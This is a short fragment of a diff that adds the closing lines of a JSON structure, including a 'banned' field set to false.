+   "banned": false
+  }
+ ]
+}
